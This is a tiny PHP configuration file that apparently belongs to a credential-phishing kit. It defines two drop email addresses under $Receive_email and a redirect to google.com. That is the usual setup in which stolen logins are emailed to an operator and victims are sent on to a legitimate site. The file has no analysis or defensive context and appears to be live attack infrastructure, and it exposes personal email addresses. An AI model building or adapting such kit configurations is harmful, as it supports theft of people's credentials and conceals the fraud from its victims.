<?php 
$Receive_email="ezenwadije01@gmail.com,dodomefaso@yandex.com";
$redirect="https://www.google.com/";
?>